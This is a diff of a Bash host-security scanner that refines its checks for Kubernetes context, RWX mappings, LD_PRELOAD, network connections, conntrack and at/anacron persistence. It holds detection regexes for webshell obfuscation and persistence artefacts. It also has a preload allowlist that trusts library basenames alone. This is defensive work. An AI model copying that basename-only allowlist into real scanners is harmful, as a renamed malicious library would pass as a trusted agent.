         if is_normal_kubernetes_component "$comm" "$cmd"; then counter="normal_kubernetes_component=${comm}"; fi
-        network=$(socket_snapshot established | grep -E "pid=${pid}," | head -5)
+        network=""
+        local est_count=0
+        for est_line in "${ESTABLISHED_LINES[@]}"; do
+            [[ "$est_line" == *"pid=${pid},"* ]] || continue
+            network="${network}${network:+$'\n'}${est_line}"
+            est_count=$((est_count + 1)); [ "$est_count" -ge 5 ] && break
+        done
         persistence=""; [ -s "$EVENT_CACHE_FILE" ] && persistence=$(grep -F "\"pid\":\"${pid}\"" "$EVENT_CACHE_FILE" 2>/dev/null | grep -E 'cron|systemd|authorized_keys|ld[.]so[.]preload' | head -3)
         printf '%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n' "${instance:-unknown}" "$pid" "$comm" "$runtime" "$clues" "$cmd" "$(printf '%s;%s' "$fds" "$mounts" | tr '\t\r\n' '   ')" "$(printf '%s' "$network" | tr '\t\r\n' '   ')" "$counter" CONTEXT >> "$out"
         KUBERNETES_CONTEXT_COUNT=$((KUBERNETES_CONTEXT_COUNT + 1))
         [ "$counter" = none ] || continue
         domains="PROCESS,FILE"; [ -z "$network" ] || domains="${domains},NETWORK"; [ -z "$persistence" ] || domains="${domains},PERSISTENCE"
-        clue_count=$(awk -F, '{print NF}' <<< "$clues")
+        clue_count=1; local cc="$clues"
+        while [[ "$cc" == *,* ]]; do cc="${cc#*,}"; clue_count=$((clue_count + 1)); done
         finding_type=SECURITY_ANOMALY
         if [ "$clue_count" -ge 2 ] && [ "$(evidence_domain_count "$domains")" -ge 3 ]; then finding_type=SECURITY_THREAT; fi
-        record_find HIGH process "容器/Kubernetes 高风险上下文: PID ${pid}" \
-            "process_instance_id=${instance:-unknown}; runtime=${runtime}; clues=${clues}; command=${cmd}; fd_mount=${fds};${mounts}; network=${network:-none}; persistence=${persistence:-none}" \
-            '核对工作负载规格、ServiceAccount、capabilities、host namespace 与运行时 Socket 授权' 'T1611' 'CNT-K8S-HIGH-VALUE-CONTEXT' "${instance:-pid:${pid}}" \
+        group_key="k8s:${comm}:${clues}"
+        if [ -z "${K8S_GROUP_SEEN[$group_key]+x}" ]; then
+            K8S_GROUP_SEEN[$group_key]=1
+            K8S_GROUP_MEMBERS[$group_key]=""
+            K8S_GROUP_ORDER+=("$group_key")
+        fi
+        K8S_GROUP_MEMBERS[$group_key]="${K8S_GROUP_MEMBERS[$group_key]}${K8S_GROUP_MEMBERS[$group_key]:+ }${#K8S_PIDS[@]}"
+        K8S_PIDS+=("$pid"); K8S_COMM+=("$comm"); K8S_RUNTIME+=("$runtime"); K8S_CLUES+=("$clues")
+        K8S_CMD+=("$cmd")
+        K8S_EV+=("pid=${pid}; instance=${instance:-unknown}; runtime=${runtime}; clues=${clues}; command=${cmd}; fd_mount=${fds};${mounts}; network=${network:-none}; persistence=${persistence:-none}")
+        K8S_DOMAINS+=("$domains"); K8S_TYPE+=("$finding_type")
+    done
+    # 聚合发告警：同组进程共用一条 Finding，证据列出成员 pid（最多 8 个）。
+    local gi members member_i group_n shown_ev line_ev threat=false group_domains group_pids first_pid
+    for group_key in "${K8S_GROUP_ORDER[@]}"; do
+        members="${K8S_GROUP_MEMBERS[$group_key]}"
+        group_n=0; shown_ev=""; threat=false; group_domains=""; group_pids=""; first_pid=""
+        for member_i in $members; do
+            group_n=$((group_n + 1))
+            [ -n "$first_pid" ] || first_pid="${K8S_PIDS[$member_i]}"
+            group_pids="${group_pids}${group_pids:+,}${K8S_PIDS[$member_i]}"
+            [ "${K8S_TYPE[$member_i]}" != "SECURITY_THREAT" ] || threat=true
+            case ",${group_domains}," in
+                *",${K8S_DOMAINS[$member_i]},"*) ;;
+                *) group_domains="${group_domains:+${group_domains},}${K8S_DOMAINS[$member_i]}" ;;
+            esac
+            if [ "$group_n" -le 8 ]; then
+                shown_ev="${shown_ev}${shown_ev:+$'\n'}${K8S_EV[$member_i]}"
+            fi
+        done
+        [ "$group_n" -gt 8 ] && shown_ev="${shown_ev}"$'\n'"…其余 $((group_n - 8)) 个同组进程见 raw/kubernetes-context.tsv"
+        comm="${K8S_COMM[${members%% *}]}"
+        if $threat; then finding_type=SECURITY_THREAT; else finding_type=SECURITY_ANOMALY; fi
+        record_find HIGH process "容器/Kubernetes 高风险上下文: ${comm} (${group_n} 进程)" \
+            "${shown_ev}" \
+            '核对工作负载规格、ServiceAccount、capabilities、host namespace 与运行时 Socket 授权' 'T1611' 'CNT-K8S-HIGH-VALUE-CONTEXT' "k8s:${comm}:${K8S_CLUES[${members%% *}]}" \
             'container-context.tsv,kubernetes-context.tsv,process-context.tsv,socket-snapshot.txt,events-normalized.jsonl' "$finding_type" MEDIUM \
             '运行时 Socket、ServiceAccount token、宿主路径或 host namespace 是逃逸与集群横向的重要上下文；单独命中仍需工作负载授权反证' \
-            '只有同一稳定进程同时出现多个高风险线索，并关联网络、持久化或其他独立域证据时升级' "$domains" \
-            "反证：${counter}；主机角色=${HOST_ROLE}；维护窗口=${MAINTENANCE_ACTIVE}" "$RUN_STARTED_AT|PROCESS|container context pid=$pid;$RUN_STARTED_AT|FILE|$clues"
+            '只有同一稳定进程同时出现多个高风险线索，并关联网络、持久化或其他独立域证据时升级' "${group_domains}" \
+            "反证：normal_kubernetes_component 或工作负载授权；主机角色=${HOST_ROLE}；维护窗口=${MAINTENANCE_ACTIVE}" "$RUN_STARTED_AT|PROCESS|container context pids=${group_pids};${RUN_STARTED_AT}|FILE|${K8S_CLUES[${members%% *}]}"
         KUBERNETES_ANOMALY_COUNT=$((KUBERNETES_ANOMALY_COUNT + 1))
     done
     KUBERNETES_CONTEXT_STATUS=$([ "$KUBERNETES_CONTEXT_COUNT" -gt 0 ] && printf AVAILABLE || printf NO_RESULTS)
@@ -3258,7 +3620,7 @@ collect_process_context_snapshot() {
         mark_current_module_partial native_runtime_process_output_invalid
     fi
     declare -A package_owner_cache=()
-    boot=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null || echo unknown)
+    boot=$(get_boot_id)
     printf 'process_instance_id\tboot_id\tpid\tstarttime\tppid\tcomm\tuid\teuid\tloginuid\ttty\texe\tpackage\tpackage_verify\tcap_eff\tnamespaces\tcontainer_id\tancestors_5\targv\tcontainer_runtime\tpod_uid\tk8s_namespace\tcgroup_path\tnamespace_inode_summary\thost_namespace_suspicious\n' > "$out"
     printf 'pid\tprocess_instance_id\tcontainer_runtime\tcontainer_id\tpod_uid\tk8s_namespace\tcgroup_path\tnamespace_inode_summary\thost_namespace_suspicious\texe\targv\n' > "$container_out"
     [ -e /.dockerenv ] || [ -e /run/.containerenv ] && host_container=true
@@ -3342,11 +3704,27 @@ check_advanced_process_behaviors() {
         if [ -n "$rwx_hit" ]; then
             domains="MEMORY,PROCESS"; [ -z "$network" ] || domains="${domains},NETWORK"
             detail="PID=${pid}; comm=${comm}; exe=${exe}; rwx=${rwx_hit}; network=${network:-none}; ancestors=${ancestry}"
-            record_find HIGH injection "匿名或可疑 RWX 映射: PID ${pid}" "$detail" '核对 JIT/运行时用途；提取映射和父进程证据' 'T1055' \
-                'MEM-RWX-MAPPING' "pid:${pid}" 'process-context.tsv,events-normalized.jsonl,ss_established.txt,proc/' \
-                'SECURITY_THREAT' MEDIUM 'RWX 可能来自 JIT，只有与异常执行或网络行为关联才进入威胁' \
-                '若无 JIT/包/发布反证且关联注入、网络或持久化，应升级' "$domains" \
-                "反证：包归属=${owner}，包校验=${verify}" "$RUN_STARTED_AT|MEMORY|RWX mapping pid=$pid"
+            # v2 误报治理：主流 JIT/解释器运行时的匿名 RWX 映射是常态（V8/PHP JIT/
+            # OpenJDK CodeCache），仅在关联网络或身份异常时才保持 HIGH。
+            rwx_sev="HIGH"; rwx_conf="MEDIUM"; rwx_rule="MEM-RWX-MAPPING"; rwx_type="SECURITY_THREAT"
+            rwx_basis='RWX 可能来自 JIT，只有与异常执行或网络行为关联才进入威胁'
+            rwx_counter="反证：包归属=${owner}，包校验=${verify}"
+            exe_base="${exe##*/}"; exe_base="${exe_base% (deleted)}"
+            case "$comm|$exe_base" in
+                node*|next-server*|php*|java*|jsvc*|python*|perl*|ruby*|dotnet*|apache2*|httpd*|nginx*|chrome*|chromium*|firefox*|mono*|bun*|deno*|networkd-dispat*|unattended-upgr*|tuned*|gluster*|packagekitd*)
+                    # 解释器型守护进程 argv0≠comm 是常态（脚本名 vs 解释器），
+                    # 身份不一致另有 OBSERVE 级独立报告，此处只看网络关联。
+                    if [ -z "$network" ]; then
+                        rwx_sev="MEDIUM"; rwx_conf="LOW"; rwx_rule="MEM-RWX-MAPPING-JIT"; rwx_type="SECURITY_ANOMALY"
+                        rwx_basis='已知 JIT 运行时的匿名 RWX 映射属于运行时常态（V8/PHP JIT/CodeCache），无网络与身份异常时不作为威胁'
+                        rwx_counter="反证：JIT 运行时(${comm})常态 RWX；包归属=${owner}，包校验=${verify}；无网络关联"
+                    fi ;;
+            esac
+            record_find "$rwx_sev" injection "匿名或可疑 RWX 映射: PID ${pid} (${comm})" "$detail" '核对 JIT/运行时用途；提取映射和父进程证据' 'T1055' \
+                "$rwx_rule" "pid:${pid}" 'process-context.tsv,events-normalized.jsonl,ss_established.txt,proc/' \
+                "$rwx_type" "$rwx_conf" "$rwx_basis" \
+                '同进程出现外连、注入事件或 memfd 时升级' "$domains" \
+                "$rwx_counter" "$RUN_STARTED_AT|MEMORY|RWX mapping pid=$pid"
         fi
         if [ "$identity_mismatch" = true ]; then
             detail="PID=${pid}; comm=${comm}; argv0=${argv0}; exe=${exe}; package=${owner}; verify=${verify}; ancestors=${ancestry}"
@@ -3641,6 +4019,13 @@ check_process() {
                 ld_sev="HIGH"; ld_type="SECURITY_ANOMALY"; ld_confidence="MEDIUM"
                 ld_reason="预加载库路径无法解析或文件不存在"; ld_rule="PRS-LD-PRELOAD-MISSING"
             elif [[ "$preload_mode" =~ [2367][0-9]$ || "$preload_mode" =~ [0-9][2367]$ ]]; then
+                # v2.1 误报治理：云厂商主机安全 agent 的常驻预加载库（腾讯云云镜
+                # libsgmon.so 等）随系统安装且全局可写属厂商签名行为，降级为低危观察。
+                case "$(basename -- "$preload_lib")" in
+                    libsgmon.so|libyunjing.so|libYunJingMonit.so|libhostguard.so|libaegis.so|libedr.so)
+                        ld_sev="LOW"; ld_type="RUNTIME_OBSERVATION"; ld_confidence="MEDIUM"
+                        ld_reason="已知云厂商主机安全 Agent 预加载库（如腾讯云云镜），非入侵迹象"; ld_rule="PRS-LD-PRELOAD-CLOUD-AGENT" ;;
+                    *)
                 if [ "$preload_loaded" = true ] && [ "$proc_euid" = "0" ]; then
                     ld_sev="HIGH"; ld_type="SECURITY_THREAT"; ld_confidence="HIGH"
                     ld_reason="特权进程实际加载了可被组或其他用户写入的预加载库"; ld_rule="PRS-LD-PRELOAD-WRITABLE-PRIVILEGED"
@@ -3648,6 +4033,7 @@ check_process() {
                     ld_sev="HIGH"; ld_type="SECURITY_ANOMALY"; ld_confidence="MEDIUM"
                     ld_reason="预加载库可被非属主修改，但未确认由特权进程实际加载"; ld_rule="PRS-LD-PRELOAD-WRITABLE"
                 fi
+                esac
             elif [[ "$preload_lib" != /lib/* && "$preload_lib" != /lib64/* && "$preload_lib" != /usr/lib/* && "$preload_lib" != /usr/lib64/* ]]; then
                 ld_sev="MEDIUM"; ld_type="SECURITY_ANOMALY"; ld_confidence="MEDIUM"
                 ld_reason="预加载库不在标准系统库目录"; ld_rule="PRS-LD-PRELOAD-NONSTANDARD"
@@ -3745,18 +4131,25 @@ commit_process_resource_baseline() {
 #==============================================================================
 
 collect_network_five_tuples() {
-    local out="${RAW_DIR}/network-five-tuples.tsv" line proto state recvq sendq local_ep remote_ep proc direction local_port listeners
-    listeners=$(socket_snapshot listen | awk '{print $5}' | sed -E 's/.*:([0-9]+)$/\1/' | sort -u)
+    local out="${RAW_DIR}/network-five-tuples.tsv"
+    # v2.3（审计热点 1）：原实现每行 6-7 次 fork（awk x4 + cut + grep）x 5000 行
+    # = 最多 3.2 万 fork。改为单次 awk 流式处理：监听端口集合以数组内建查找。
+    socket_snapshot listen | awk '{print $5}' | sed -E 's/.*:([0-9]+)$/\1/' | sort -u > "${RAW_DIR}/.listen-ports.${RUN_ID}"
     printf 'protocol\tstate\tlocal_endpoint\tremote_endpoint\tdirection\tprocess\n' > "$out"
-    while IFS= read -r line; do
-        [ -n "$line" ] || continue
-        proto=$(printf '%s' "$line" | awk '{print $1}'); state=$(printf '%s' "$line" | awk '{print $2}')
-        local_ep=$(printf '%s' "$line" | awk '{print $5}'); remote_ep=$(printf '%s' "$line" | awk '{print $6}'); proc=$(printf '%s' "$line" | cut -d' ' -f7-)
-        local_port=$(endpoint_port "$local_ep"); direction=OUTBOUND
-        printf '%s\n' "$listeners" | grep -qx "$local_port" && direction=INBOUND_OR_SERVER_SIDE
-        [ "$state" = LISTEN ] && direction=LISTEN
-        printf '%s\t%s\t%s\t%s\t%s\t%s\n' "$proto" "$state" "$local_ep" "$remote_ep" "$direction" "$proc" >> "$out"
-    done < <(socket_snapshot all | head -5000)
+    socket_snapshot all | head -5000 | awk -F ' ' '
+        NR == FNR { listen[$1] = 1; next }
+        NF >= 6 {
+            proto = $1; state = $2; local_ep = $5; remote_ep = $6
+            proc_field = $7
+            for (i = 8; i <= NF; i++) proc_field = proc_field " " $i
+            ep = local_ep; sub(/.*:/, "", ep)
+            direction = "OUTBOUND"
+            if (ep in listen) direction = "INBOUND_OR_SERVER_SIDE"
+            if (state == "LISTEN") direction = "LISTEN"
+            printf "%s\t%s\t%s\t%s\t%s\t%s\n", proto, state, local_ep, remote_ep, direction, proc_field
+        }
+    ' "${RAW_DIR}/.listen-ports.${RUN_ID}" - >> "$out"
+    rm -f "${RAW_DIR}/.listen-ports.${RUN_ID}"
     record_raw_status 'network-five-tuples.tsv' SUCCESS network ''
 }
 
@@ -3775,6 +4168,7 @@ connection_baseline_seen() {
 
 analyze_connection_baseline() {
     local out="${RAW_DIR}/abnormal-connections.tsv" line local_ep remote_ep remote_ip remote_port pid display instance exe user cmd ppid service package exe_hash key sev reason new_file=false
+    declare -A CONN_EXE_HASH_CACHE=()
     local listen_key local_port baseline_exists=false
     ABNORMAL_CONN_SEVS=(); ABNORMAL_CONN_PIDS=(); ABNORMAL_CONN_INSTANCES=(); ABNORMAL_CONN_EXES=(); ABNORMAL_CONN_USERS=(); ABNORMAL_CONN_CMDS=()
     ABNORMAL_CONN_TARGETS=(); ABNORMAL_CONN_NEW=(); ABNORMAL_CONN_PACKAGES=(); ABNORMAL_CONN_RAW=(); ABNORMAL_CONN_PPIDS=(); ABNORMAL_CONN_SERVICES=()
@@ -3793,7 +4187,14 @@ analyze_connection_baseline() {
         pid=$(printf '%s\n' "$line" | sed -nE 's/.*pid=([0-9]+).*/\1/p' | head -1); [[ "$pid" =~ ^[0-9]+$ ]] || continue
         display=$(process_display_for_pid "$pid" 2>/dev/null) || continue
         IFS=$'\t' read -r instance _ exe user cmd ppid service package <<< "$display"
-        exe_hash=UNAVAILABLE; [ -f "${exe% (deleted)}" ] && exe_hash=$(sha256_file "${exe% (deleted)}" 2>/dev/null || echo UNAVAILABLE)
+        # v2.3（审计 R7）：同 exe 的数百条连接此前逐条重算 sha256，加关联数组缓存。
+        local cache_key="${exe% (deleted)}"
+        if [ -n "${CONN_EXE_HASH_CACHE[$cache_key]:-}" ]; then
+            exe_hash="${CONN_EXE_HASH_CACHE[$cache_key]}"
+        else
+            exe_hash=UNAVAILABLE; [ -f "$cache_key" ] && exe_hash=$(sha256_file "$cache_key" 2>/dev/null || echo UNAVAILABLE)
+            CONN_EXE_HASH_CACHE[$cache_key]="$exe_hash"
+        fi
         key="${exe_hash}|${exe}|${user}|${remote_ip}|${remote_port}"
         awk -F '\t' -v key="$key" '$1=="CONN" && $2==key{found=1;exit} END{exit !found}' "$CONNECTION_BASELINE_PENDING" 2>/dev/null || printf 'CONN\t%s\t%s\t%s\n' "$key" "$RUN_STARTED_AT" "$RUN_STARTED_AT" >> "$CONNECTION_BASELINE_PENDING"
         [ "$baseline_exists" = true ] || continue
@@ -3803,7 +4204,7 @@ analyze_connection_baseline() {
         [[ "$exe" == /tmp/* || "$exe" == /var/tmp/* || "$exe" == /dev/shm/* ]] && { sev=HIGH; reason='临时目录进程出现历史未见外连'; }
         [[ "$exe" == *'(deleted)'* || "$exe" == *memfd:* ]] && { sev=HIGH; reason='deleted/memfd 进程出现历史未见外连'; }
         [ "$package" != unowned ] || { [ "$sev" = HIGH ] || sev=MEDIUM; reason="${reason}；程序无包归属"; }
-        local profile_inventory="${STATE_DIR}/file_inventory.${SCAN_PROFILE}.state"
+        local profile_inventory="${STATE_DIR}/file_inventory.${STATE_PROFILE_KEY:-$SCAN_PROFILE}.state"
         [ -s "$profile_inventory" ] || { [ "$SCAN_PROFILE" != daily-hunt ] || profile_inventory="${STATE_DIR}/file_inventory.state"; }
         if [ -s "$profile_inventory" ] && ! awk -F '\t' -v p="${exe% (deleted)}" '$1==p{found=1;exit} END{exit !found}' "$profile_inventory"; then
             new_file=true; [ "$sev" = HIGH ] || sev=MEDIUM; reason="${reason}；执行文件不在上一轮文件基线"
@@ -3844,6 +4245,30 @@ commit_connection_baseline() {
     [ "$CONNECTION_BASELINE_READY" = true ] || return 0
     [ -s "$CONNECTION_BASELINE_PENDING" ] || return 1
     chmod 600 "$CONNECTION_BASELINE_PENDING" && mv "$CONNECTION_BASELINE_PENDING" "$CONNECTION_BASELINE_FILE"
+}
+
+collect_conntrack_history() {
+    local out="${RAW_DIR}/conntrack-history.txt" ext_count=0
+    : > "$out"
+    if [ -r /proc/net/nf_conntrack ]; then
+        awk '$1=="ipv4" || $1=="ipv6"' /proc/net/nf_conntrack >> "$out" 2>/dev/null
+    elif command -v conntrack >/dev/null 2>&1; then
+        conntrack -L 2>/dev/null >> "$out"
+    fi
+    if [ -s "$out" ]; then
+        # 统计非本机/私有网段的对端，快速看出本轮活跃过的外部端点规模。
+        ext_count=$(grep -oE 'dst=[0-9a-fA-F:.]+' "$out" 2>/dev/null \
+            | cut -d= -f2 \
+            | grep -vE '^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|::1|fe80:|fc00:|fd)' \
+            | sort -u | wc -l | tr -d ' ')
+        printf 'external_unique_peers=%s\n' "$ext_count" >> "$out"
+        record_raw_status 'conntrack-history.txt' SUCCESS network "external_unique_peers=${ext_count}"
+        [ "$ext_count" -gt 0 ] || record_raw_status 'conntrack-history.txt' NO_RESULTS network ''
+    else
+        # 无 nf_conntrack 模块/权限：诚实记录不可用（常见于未加载 conntrack 的宿主）。
+        printf '# conntrack unavailable on this host\n' > "$out"
+        record_raw_status 'conntrack-history.txt' UNAVAILABLE network 'nf_conntrack_not_readable'
+    fi
 }
 
 check_network() {
@@ -4011,6 +4436,11 @@ check_network() {
     dump_raw "iptables_rules.txt" iptables -L -n -v
     dump_raw "arp_table.txt" arp -a
 
+    # conntrack：本轮"发生过但快照时已断开"的外联历史。socket 快照只能看到
+    # 检查瞬间的连接，短连接 C2 回传/外传数据会漏；conntrack 表补上时间窗内的
+    # 历史记录。只落证据 + 外部对端计数，不新增 finding（避免噪声）。
+    collect_conntrack_history
+
     log_info "网络连接检查完成"
 }
 
@@ -4093,6 +4523,11 @@ check_rootkit() {
                     elif [ "$preload_owner" = "root:root" ] && [[ "$preload_mode" =~ ^[0-7][045][045]$ ]]; then
                         preload_sev="OBSERVE"; preload_confidence="LOW"
                         preload_reason="库由 root 持有且组/其他用户不可写，需确认第三方软件来源"; preload_rule="INT-LD-PRELOAD-PROTECTED"
+                    elif is_whitelisted_path "$preload_lib"; then
+                        # path.allow 命中（云厂商/运维组件），且未命中前述危险路径/权限条件，
+                        # 降为机制观察，避免云主机已知组件每轮告警。
+                        preload_sev="OBSERVE"; preload_confidence="LOW"
+                        preload_reason="path.allow 白名单命中的受信组件，保留机制观察"; preload_rule="INT-LD-PRELOAD-ALLOWED"
                     fi
                 fi
                 local preload_detail="config=${f}; lib=${preload_lib}; owner=${preload_owner:-unknown}; mode=${preload_mode:-unknown}; package=${preload_package:-unowned}; sha256=${preload_sha:-unknown}; assessment=${preload_reason}"
@@ -4141,7 +4576,13 @@ check_rootkit() {
     if [ "$PROFILE_PACKAGE_INTEGRITY" != true ]; then
         log_info "${SCAN_PROFILE} 跳过 rpm -Va / debsums"
         record_raw_status 'package-integrity.txt' NOT_APPLICABLE rootkit "profile=${SCAN_PROFILE}"
-    else case "${PKG_MGR}" in
+    elif ! periodic_task_due package-integrity; then
+        # full-diff 档：包完整性校验按 SECSCOPE_PERIODIC_DAYS 间隔执行（默认 7 天），
+        # 日常差分轮依靠文件基线增量与进程包归属覆盖。
+        log_info "全包完整性校验未到执行间隔（SECSCOPE_PERIODIC_DAYS=${SECSCOPE_PERIODIC_DAYS:-7}），本轮跳过"
+        record_raw_status 'package-integrity.txt' SKIPPED rootkit "interval_days=${SECSCOPE_PERIODIC_DAYS:-7};profile=${SCAN_PROFILE}"
+    else
+        case "${PKG_MGR}" in
         rpm)
             # rpm -Va 本身只输出差异；配置文件经常被正常修改，只提升可执行文件和库的差异。
             local changed=$(rpm -Va 2>/dev/null | awk '$NF ~ /^\/(bin|sbin|usr\/bin|usr\/sbin|lib|lib64)\// {print}' | head -30)
@@ -4154,6 +4595,9 @@ check_rootkit() {
             else
                 log_info "RPM 文件完整性通过"
             fi
+            # 检查真正执行过才打点；否则工具缺失的"跳过"会把后续 6 天的
+            # 重试机会一起压制掉。
+            stamp_periodic_task package-integrity
             ;;
         dpkg)
             if command -v debsums &>/dev/null; then
@@ -4164,14 +4608,17 @@ check_rootkit() {
                 else
                     log_info "debsums 完整性通过"
                 fi
+                stamp_periodic_task package-integrity
             else
                 log_info "debsums 未安装，跳过完整性检查"
+                record_raw_status 'package-integrity.txt' PARTIAL rootkit 'debsums_not_installed;periodic_stamp_deferred'
             fi
             ;;
     esac
     fi
 
     # ---- 原始数据 ----
+    collect_sysctl_security_baseline
     dump_raw "lsmod.txt" lsmod
     dump_raw "proc_modules.txt" cat /proc/modules
     [ -s /etc/ld.so.preload ] && dump_raw "ld_preload_config.txt" cat /etc/ld.so.preload
@@ -4184,6 +4631,23 @@ check_rootkit() {
 #==============================================================================
 # 06 — 持久化机制
 #==============================================================================
+
+# at(1) 队列与 anacron 是 cron/systemd 之外的第三类定时持久化面，此前未采集。
+collect_at_anacron_jobs() {
+    local out="${RAW_DIR}/at-anacron-jobs.txt" entries=0
+    {
+        echo "=== at queue (atq) ==="
+        atq 2>/dev/null && entries=$((entries + $(atq 2>/dev/null | wc -l)))
+        echo "=== anacron (pending schedules) ==="
+        cat /etc/anacrontab 2>/dev/null | grep -v '^#' | grep -v '^$' && entries=$((entries + $(grep -cvE '^(#|$)' /etc/anacrontab 2>/dev/null || echo 0)))
+        echo "=== at spool ==="
+        for d in /var/spool/cron/atjobs /var/spool/at /var/spool/atjobs; do
+            [ -d "$d" ] && ls -la "$d" 2>/dev/null
+        done
+    } > "$out" 2>/dev/null
+    grep -q '^[a-f0-9]' "$out" 2>/dev/null || true
+    record_raw_status 'at-anacron-jobs.txt' "$([ -s "$out" ] && printf SUCCESS || printf NO_RESULTS)" persistence "at_jobs_found=$(atq 2>/dev/null | wc -l | tr -d ' ')"
+}
 
 check_persistence() {
     echo ""
@@ -4359,6 +4823,7 @@ check_persistence() {
         done
     } | dump_raw "crontab_all.txt"
     dump_raw "systemd_services.txt" systemctl list-unit-files --type=service
+    collect_at_anacron_jobs
 
     log_info "持久化机制检查完成"
 }
@@ -4393,6 +4858,13 @@ file_entropy_estimate() {
 web_static_structure_score() {
     local path="$1" score=0 reasons="" entropy long_line=0 structural=0
     [ -f "$path" ] || { printf '0\tmissing\t0\t0'; return; }
+    # 超大文件（minified bundle、日志、镜像层）会让 grep -E 的有界重复在
+    # 超长单行上灾难性回溯，单文件就能拖住整个管线数分钟；bash 评分只面向
+    # 小体积脚本型文件，大文件交给有界的 native analyze-static。
+    local fsize
+    fsize=$(stat -c %s -- "$path" 2>/dev/null) || fsize=""
+    case "$fsize" in ''|*[!0-9]*) fsize=0 ;; esac
+    [ "$fsize" -le 8388608 ] || { printf '0\toversized_skipped\t0\t0'; return; }
     if LC_ALL=C grep -Eaq '(base64_decode|atob|FromBase64String).*(gzinflate|gzuncompress|str_rot13|xor|pack)|((gzinflate|gzuncompress|str_rot13|xor|pack).*(base64_decode|atob|FromBase64String))' "$path" 2>/dev/null; then
         score=$((score + 3)); structural=$((structural + 1)); reasons="${reasons}多层解码/变换;"
     fi
@@ -4514,7 +4986,7 @@ run_with_timeout() {
 
 static_pipeline_stage_budget() {
     local stages_left="${1:-1}" remaining
-    STATIC_STAGE_TIMEOUT="$YARA_TOTAL_TIMEOUT"
+    STATIC_STAGE_TIMEOUT="$STATIC_TOTAL_TIMEOUT"
     [ "$STATIC_PIPELINE_DEADLINE" -gt 0 ] || return 0
     remaining=$((STATIC_PIPELINE_DEADLINE - SECONDS))
     if [ "$remaining" -le 0 ]; then
@@ -4605,7 +5077,16 @@ discover_web_roots() {
         esac
         readlink -f "$pid/cwd" 2>/dev/null >> "$roots" || true
     done
-    LC_ALL=C awk 'substr($0,1,1)=="/" && !seen[$0]++ {print}' "$roots" | while IFS= read -r path; do
+    # v2 修复：守护进程 cwd 常为 /，把整个根文件系统当成 web 根会让公平配额
+    # 失效（v1.1 实测 103 万文件/16 根、每根仅 218 个配额，样本目录被饿死）。
+    # 剔除 /、/usr、/var 等泛化浅路径；保留 /app 这类具体应用目录。
+    LC_ALL=C awk '
+        substr($0,1,1)=="/" && !seen[$0]++ {
+            n = gsub(/\//, "/");
+            base = $0; sub(/.*\//, "", base);
+            if (n >= 2) print $0;
+            else if (base !~ /^(usr|var|etc|opt|srv|home|root|bin|sbin|lib|lib64|lib32|run|boot|proc|sys|dev|mnt|media|data|tmp)$/) print $0;
+        }' "$roots" | while IFS= read -r path; do
         [ -d "$path" ] && [ ! -L "$path" ] && printf '%s\n' "$path"
     done > "${roots}.valid"
     mv "${roots}.valid" "$roots"; chmod 600 "$roots"
@@ -4647,8 +5128,21 @@ append_runtime_binary_candidates() {
     chmod 600 "$runtime" "$changed" "$STATIC_CANDIDATE_FILE" "$STATIC_COVERAGE_FILE" 2>/dev/null || true
 }
 
+# v2 取证优先：把 file-monitor 的本轮新增/变化文件并入静态候选列表头部。
+# 最近落地的文件是最高价值的分析对象，且已被 file-monitor 枚举哈希；
+# v1.1 只分析 discovery 配额命中的文件，样本目录可能被大目录挤出配额。
+merge_recent_file_candidates() {
+    local target="$1" changes="${RAW_DIR}/file-changes.tsv" suspicious="${RAW_DIR}/suspicious-files.tsv"
+    local merged="${target}.merged"
+    {
+        [ -s "$changes" ] && awk -F '\t' 'NR>1 && $2 ~ /^\// {print $2}' "$changes"
+        [ -s "$suspicious" ] && awk -F '\t' 'NR>1 && $6 ~ /^\// {print $6}' "$suspicious"
+        cat "$target" 2>/dev/null
+    } | awk '!seen[$0]++' > "$merged" 2>/dev/null && mv "$merged" "$target" || rm -f "$merged"
+}
+
 build_static_candidate_list() {
-    local roots="${RAW_DIR}/static-roots.txt" summary="${RAW_DIR}/static-discovery-summary.json" stage_timeout="${STATIC_STAGE_TIMEOUT:-$YARA_TOTAL_TIMEOUT}"
+    local roots="${RAW_DIR}/static-roots.txt" summary="${RAW_DIR}/static-discovery-summary.json" stage_timeout="${STATIC_STAGE_TIMEOUT:-$STATIC_TOTAL_TIMEOUT}"
     STATIC_CANDIDATE_FILE="${RAW_DIR}/static-candidates.txt"
     STATIC_COVERAGE_FILE="${RAW_DIR}/static-coverage.jsonl"
     STATIC_CANDIDATE_STATUS=NOT_RUN
@@ -4718,36 +5212,107 @@ PY
         record_raw_status 'static-coverage.jsonl' PARTIAL filesystem "discovery_exit_${rc}"
         mark_current_module_partial "static_discovery_exit_${rc}"
     fi
+    merge_recent_file_candidates "$STATIC_CANDIDATE_FILE"
     append_runtime_binary_candidates
 }
 
 
 run_static_language_adapters() {
     local candidate_file="${1:-$STATIC_CANDIDATE_FILE}"
-    local out="${RAW_DIR}/static-analysis.jsonl" summary="${RAW_DIR}/static-analysis-summary.json" projection="${RAW_DIR}/static-analysis-projection.tsv" rc=0 native_status=SUCCESS stage_timeout="${STATIC_STAGE_TIMEOUT:-$YARA_TOTAL_TIMEOUT}" expected_count=0 scanned_count=0
-    if [ "$stage_timeout" -le 0 ]; then
+    local out="${RAW_DIR}/static-analysis.jsonl" summary="${RAW_DIR}/static-analysis-summary.json" projection="${RAW_DIR}/static-analysis-projection.tsv" rc=0 native_status=SUCCESS stage_timeout="${STATIC_STAGE_TIMEOUT:-$STATIC_TOTAL_TIMEOUT}" expected_count=0 scanned_count=0
+    # v2.3 lane 并行：ENGINE_ONLY=1 时只执行引擎落盘（输出文件相互独立），
+    # record_find 富化/状态标记由父进程在 wait 之后执行——后台子 shell 的
+    # 数组写会丢失，必须留在父进程。
+    if [ "${SECSCOPE_LANE_ENGINE_ONLY:-}" = "1" ]; then
+        if [ "$stage_timeout" -le 0 ]; then
+            printf '{"detector":"secscope-unified-static","status":"PARTIAL","timeout":true,"scanned":0}\n' > "$out"
+            printf '%s' "0" > "${RAW_DIR}/.static-engine-rc.${RUN_ID}" 2>/dev/null || true
+            return 0
+        fi
+        if command -v python3 >/dev/null 2>&1 && [ -r "$DETECT_ENGINE_PATH" ] && [ -r "$DETECT_PACK_PATH" ]; then
+            local -a lane_args=(analyze-static --input-list "$candidate_file" \
+                --output-jsonl "$out" --projection-tsv "$projection" --max-files "$STATIC_MAX_FILES" --timeout-seconds "$stage_timeout" \
